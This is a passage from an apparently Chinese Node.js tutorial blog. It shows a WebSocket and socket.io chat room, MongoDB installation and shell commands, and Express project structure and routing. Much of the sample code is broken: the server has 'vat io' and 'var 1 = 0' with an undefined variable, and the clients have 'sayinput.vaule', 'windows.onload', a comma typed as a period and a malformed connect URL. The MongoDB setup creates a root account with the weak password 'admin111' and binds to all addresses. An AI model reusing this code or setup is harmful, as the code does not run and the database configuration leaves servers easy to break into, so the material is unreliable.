class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chatroom"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"sayinput"</span> <span class="attr">id</span>=<span class="string">"sayinput"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"send"</span> <span class="attr">id</span>=<span class="string">"sendbutton"</span> <span class="attr">value</span>=<span class="string">"发送"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"client.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">      ws.send(sayinput.value)</span></span><br><span class="line"><span class="actionscript">      sayinput.vaule = <span class="string">""</span></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onkeyup = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (event.keycode == <span class="number">13</span>)&#123;</span></span><br><span class="line"><span class="undefined">          send()</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="actionscript">      sendbutton.onclick = <span class="function"><span class="keyword">function</span> <span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="undefined">        send()</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-socket-io实现socket"><a href="#3-socket-io实现socket" class="headerlink" title="3). socket.io实现socket"></a>3). <code>socket.io</code>实现socket</h4><p>当浏览器不支持html5时，就不能用websocket了</p><p>借助express实现: <code>npm i express socket.io</code></p><p>socket_io.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)()</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app)</span><br><span class="line">vat io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http)</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, (req,res)=&gt;&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    res.send(data.toString())</span><br><span class="line">  &#125;</span><br><span class="line">  fs.readFile(<span class="string">'socketIOClient.html'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"文件不存在"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        callback(data)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.get('/socket.io.js')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//socket.io的设置</span></span><br><span class="line"><span class="comment">//在线用户</span></span><br><span class="line"><span class="keyword">var</span> onlineUsers = &#123;&#125;</span><br><span class="line"><span class="comment">//在线人数</span></span><br><span class="line"><span class="keyword">var</span> onlineCount = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="number">1</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"有人上线了"</span>);</span><br><span class="line">  <span class="comment">//监听新用户加入</span></span><br><span class="line">  socket.name = i</span><br><span class="line">  onlineUsers[socket.name] = socket</span><br><span class="line"></span><br><span class="line">  <span class="comment">//监听用户退出</span></span><br><span class="line">  socket.on(<span class="string">'disconnect'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"有人退出了"</span>);</span><br><span class="line">    <span class="keyword">delete</span> onlineUsers[socket.name]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">//监听用户发布的聊天内容</span></span><br><span class="line">  socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>)</span>&#123;</span><br><span class="line">      broadcast(msg, socket)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//广播方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">broadcast</span>(<span class="params">msg, socket</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> onlineUsers)&#123;</span><br><span class="line">    onlineUsers[key].send(socket.name + <span class="string">'说：'</span> + msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.listen(<span class="number">9002</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">""</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>html</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    #chatroom&#123;</span><br><span class="line">      width:<span class="number">400</span>px;</span><br><span class="line">      height:<span class="number">600</span>px;</span><br><span class="line">      overflow:auto;</span><br><span class="line">      border:<span class="number">1</span>px solid bule</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script src="./</span>socket.io.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;script type="</span>text/javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        var iosocket = null;</span></span><br><span class="line"><span class="string">        windows.onload = function ()&#123;</span></span><br><span class="line"><span class="string">          iosocket = io.connect('http://127.0.0.1/9002')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          iosocket.on('connect'. function ()&#123;</span></span><br><span class="line"><span class="string">            iosocket.send('hello, from inclient')</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          //接收数据</span></span><br><span class="line"><span class="string">          iosocket.on('message', function (message)&#123;</span></span><br><span class="line"><span class="string">            var chatroom = document.getElementById("</span>chatroom<span class="string">");</span></span><br><span class="line"><span class="string">            chatroom.innerHtml += message = '&lt;/br&gt;'</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          //断开连接</span></span><br><span class="line"><span class="string">          iosocket.on('disconnect', function ()&#123;</span></span><br><span class="line"><span class="string">            console.log("</span>服务端关闭<span class="string">");</span></span><br><span class="line"><span class="string">          &#125;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          function send()&#123;</span></span><br><span class="line"><span class="string">            iosocket.send(sayinput.value)</span></span><br><span class="line"><span class="string">            sayinput.value = "</span><span class="string">''</span><span class="string">"</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          document.onkeyup = function(event)&#123;</span></span><br><span class="line"><span class="string">            if (event.keycode == 13)&#123;</span></span><br><span class="line"><span class="string">              send()</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          sendbutton.onclick = function ()&#123;</span></span><br><span class="line"><span class="string">            send()</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;div id="</span>chatroom<span class="string">"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;input type="</span>text<span class="string">" name="</span>sayinput<span class="string">" id="</span>sayinput<span class="string">" value="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">  &lt;input type="</span>button<span class="string">" name="</span>send<span class="string">" id="</span>sendbutton<span class="string">" value="</span>发送<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><h2 id="七-MongoDB"><a href="#七-MongoDB" class="headerlink" title="七.MongoDB"></a>七.MongoDB</h2><h4 id="安装-Linux下"><a href="#安装-Linux下" class="headerlink" title="安装(Linux下)"></a>安装(Linux下)</h4><p><strong>1. 通过公钥对资源包一致性和真实性进行验证：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4</span><br></pre></td></tr></table></figure><p><strong>2. 运行下行命令，创建文件/etc/apt/sources.list.d/mongodb-org-4.0.list：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.0 multiverse"</span> | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list</span><br></pre></td></tr></table></figure><p><strong>3. 在安装之前，先更新系统资源包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p><strong>4. 安装mongodb资源包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装MongoDB server</span></span><br><span class="line">sudo apt-get install -y mongodb-org </span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装MongoDB 客户端</span></span><br><span class="line">sudo apt-get install mongodb-clients</span><br></pre></td></tr></table></figure><p><strong>4. 检验是否安装成功：</strong></p><p>启动mongod服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo service mongod start </span><br><span class="line"></span><br><span class="line"><span class="comment">#查看mongo版本:</span></span><br><span class="line">mongo --version</span><br></pre></td></tr></table></figure><p><strong>5.登录MongoDB并设置密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录</span></span><br><span class="line">mongo</span><br><span class="line"><span class="comment"># 切换到admin数据库</span></span><br><span class="line">use admin</span><br><span class="line"><span class="comment"># 创建admin账号，密码::admin111 权限：root权限，授权的数据库名：admin</span></span><br><span class="line">db.createUser(&#123;user:<span class="string">"admin"</span>, <span class="built_in">pwd</span>:<span class="string">"admin111"</span>, roles:[&#123;role:<span class="string">"root"</span>, db:<span class="string">"admin"</span>&#125;]&#125;)</span><br></pre></td></tr></table></figure><p>编辑MongoDB配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mongod.conf</span><br><span class="line"></span><br><span class="line">net:</span><br><span class="line">  port: 27017  <span class="comment"># 端口</span></span><br><span class="line">  bindIp: 0.0.0.0  <span class="comment"># 允许访问的地址，0.0.0.0表示所有</span></span><br><span class="line"></span><br><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure><p>重启MongoDB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mongod.service</span><br></pre></td></tr></table></figure><p>测试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo -u admin -p admin111 --authenticationDatabase admin</span><br></pre></td></tr></table></figure><h5 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h5><blockquote><p>与mysql语法对比：<a href="https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.jb51.net/article/65626.htm?tdsourcetag=s_pctim_aiomsg</a></p></blockquote><h6 id="术语、概念"><a href="#术语、概念" class="headerlink" title="术语、概念"></a>术语、概念</h6><p><img src="/Node-js-入门/mysql.png" alt></p><p><img src="/Node-js-入门/mysql2.png" alt></p><p><strong>MongoDB集合</strong></p><p>一个数据库可以有多个集合(对应mysql的table)</p><p><strong>MongoDB文档</strong></p><p>键值对</p><p>如：<code>{&#39;name&#39;:&#39;xps&#39;, &#39;like&#39;:[&#39;code&#39;,&#39;play&#39;]}</code></p><p><strong>MongoDB数据类型</strong></p><p><img src="/Node-js-入门/type.png" alt></p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h6 id="1-数据库操作"><a href="#1-数据库操作" class="headerlink" title="1.数据库操作"></a>1.数据库操作</h6><p>查看帮助</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span></span><br><span class="line">db.help()</span><br><span class="line">db.test.help()</span><br><span class="line">df.test.find().<span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>创建/切换数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use music  <span class="comment"># 如果不存在就创建，存在且切换</span></span><br></pre></td></tr></table></figure><p>查询数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show dbs   <span class="comment"># 当数据库为空时，是不显示的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们向一个集合里面插入一个文档</span></span><br><span class="line">db.user.insertOne(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>,<span class="string">'like'</span>:[<span class="string">'code'</span>,<span class="string">'play'</span>]&#125;)</span><br><span class="line"><span class="comment"># 查看集合里面的文档(行)</span></span><br><span class="line">db.user.find()</span><br></pre></td></tr></table></figure><p>查看当前使用的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">db.getName()</span><br></pre></td></tr></table></figure><p>显示当前DB状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.stats()</span><br></pre></td></tr></table></figure><p>查看当前DB版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.version()</span><br></pre></td></tr></table></figure><p>查看当前DB的链接机器地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.getMongo()</span><br></pre></td></tr></table></figure><p>删除数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure><h6 id="2-集合（Collection）操作"><a href="#2-集合（Collection）操作" class="headerlink" title="2.集合（Collection）操作"></a>2.集合（Collection）操作</h6><p>….写了半天，忘了保存，算了，放图片吧….</p><p><img src="/Node-js-入门/collec.png"></p><h6 id="3-文档操作"><a href="#3-文档操作" class="headerlink" title="3.文档操作"></a>3.文档操作</h6><p>对集合内数据增删改查</p><p><img src="/Node-js-入门/q0.png"></p><p>删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.user.remove(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br><span class="line">db.user.delete(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br><span class="line">db.user.deleteMany(&#123;<span class="string">'name'</span>:<span class="string">'xps'</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/Node-js-入门/q1.png"></p><p><img src="/Node-js-入门/q2.png"></p><p><img src="/Node-js-入门/q3.png"></p><h2 id="八-Express框架"><a href="#八-Express框架" class="headerlink" title="八. Express框架"></a>八. Express框架</h2><blockquote><p>一个node.js的web框架</p></blockquote><h4 id="1-准备"><a href="#1-准备" class="headerlink" title="1). 准备"></a>1). 准备</h4><p><strong>安装</strong></p><p><code>npm install express --save</code>, Windows下还有:<code>npm install -g express-generator</code></p><p><code>express -h</code> 测试安装成功</p><p>新建项目：<code>express test_express</code> </p><p><strong>目录结构：</strong></p><p>package.js是需要的依赖，切换到项目根目录手动安装<code>npm install</code></p><p>app.js是入口</p><p>www/bin下面是端口等配置</p><p><strong>启动项目：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><h4 id="2-Express初始化项目详解"><a href="#2-Express初始化项目详解" class="headerlink" title="2). Express初始化项目详解"></a>2). Express初始化项目详解</h4><p>一些模块</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">"dependencies": &#123;</span><br><span class="line">  //"body-parser": "~1.15.2",   // 解析前端提交的数据</span><br><span class="line">  "cookie-parser": "~1.4.4",   //解析cookie</span><br><span class="line">  "debug": "~2.6.9",    // 用来显示调试信息</span><br><span class="line">  //"ejs": "~2.5.2",   //模板，渲染页面   </span><br><span class="line">  "express": "~4.16.1",  </span><br><span class="line">  "http-errors": "~1.6.3", </span><br><span class="line">  "jade": "~1.11.0",   //模板，渲染页面</span><br><span class="line">  "morgan": "~1.9.1"   //日志，控制后格式化显示信息</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bin/www</code>入口文件</p><p>实现了创建服务和中间件、路由配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">normalizePort() 方法，对端口进行简单处理</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>路由中间件</span><br><span class="line"><span class="number">2.</span>自定义中间件（app.set(<span class="string">'port'</span>, port)这样）</span><br><span class="line"></span><br><span class="line">app.use()</span><br></pre></td></tr></table></figure><p><code>app.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));   <span class="comment">//设置静态文件路径</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> usersRouter = <span class="built_in">require</span>(<span class="string">'./routes/users'</span>);</span><br><span class="line">app.use(<span class="string">'/users'</span>, usersRouter);</span><br></pre></td></tr></table></figure><p><code>router/xxx.js</code> 路由的中间件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> //这里的index就是view下面的index.jade</span><br><span class="line">res.render(&apos;index&apos;, &#123; title: &apos;Express&apos; &#125;);  //渲染模板 ， index不用写后缀名</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#比如 index.js</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">// get('/', xxx) 因为前面写了/user，所以这里只写/即可</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123; </span><br><span class="line">  res.send(<span class="string">'respond with a resource'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;  <span class="comment">// 暴露出去，才能以中间件的形式存在</span></span><br></pre></td></tr></table></figure><p><code>views/xxx.jade</code> 模板文件</p><h4 id="3-Express中的路由"><a href="#3-Express中的路由" class="headerlink" title="3). Express中的路由"></a>3). Express中的路由</h4><p>users.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET users listing. */</span></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'respond with a resource'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二层路由，第一层在app.js里</span></span><br><span class="line">router.get(<span class="string">'/list'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'user list'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以写成表达式（正则）</span></span><br><span class="line">router.get(<span class="string">'/a*d'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">'表达式路由'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//转到一个文件</span></span><br><span class="line">router.get(<span class="string">'/form'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendFile(__dirname + <span class="string">'/form.html'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//post请求</span></span><br><span class="line">router.post(<span class="string">'/save'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">"表单提交!"</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// all， post和get都接收</span></span><br><span class="line">router.all(<span class="string">'/all'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.send(<span class="string">"post和get都接收!"</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>form.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/users/save"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"formClass"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line">        username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span 